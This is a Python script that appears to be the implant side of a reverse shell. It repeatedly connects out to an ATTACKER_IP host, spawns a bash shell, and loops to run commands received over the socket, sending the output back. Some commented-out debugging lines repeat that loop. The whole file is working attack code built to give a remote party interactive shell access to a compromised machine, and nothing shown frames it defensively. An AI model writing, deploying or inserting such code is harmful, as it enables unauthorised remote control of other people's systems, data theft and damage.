import socket
import subprocess
import pexpect
from config import *
from socket_with_buffer import Socket
from time import sleep

def main():
    # target machine is the client in TCP 
    client_socket = Socket()

    # periodically have target machine reach out to attacker machine
    while client_socket.connect(ATTACKER_IP, PORT_NUMBER) != 0:
        sleep(SLEEP_TIME)

    child_shell = pexpect.spawn('/bin/bash', encoding='utf-8')
    child_shell.expect(TARGET_SHELL_PROMPT_REGEX_LIST)

    # receive and process user commands and return output
    while True:
        prompt = child_shell.after

        client_socket.send(prompt)

        received_command = client_socket.receive()
        child_shell.sendline(received_command)
        index = child_shell.expect(TARGET_SHELL_PROMPT_REGEX_LIST)

        command_output = child_shell.before # also includes actual command but could get rid of?
        client_socket.send(command_output)


        # received_command = client_socket.receive()
        # # print('message received is:', received_command) # debugging command
        


        # child_shell.sendline(received_command)
        # index = child_shell.expect(TARGET_SHELL_PROMPT_REGEX_LIST)
        # print()
        # print('before is:', child_shell.before)
        # print('after is:', child_shell.after)
        # print()
        # command_output = child_shell.before
        # client_socket.send(command_output)


if __name__ == '__main__':
    main()

    